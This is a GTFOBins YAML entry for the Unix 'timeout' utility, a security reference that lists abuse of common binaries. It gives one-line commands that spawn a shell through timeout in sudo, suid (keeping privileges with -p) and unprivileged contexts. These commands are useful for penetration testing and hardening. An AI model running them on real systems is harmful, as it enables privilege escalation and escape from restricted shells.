<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/timeout -->
---
functions:
  shell:
  - code: |-
      timeout 0 /bin/sh
    contexts:
      sudo:
      suid:
        code: |-
          timeout 0 /bin/sh -p
        shell: false
      unprivileged:
...
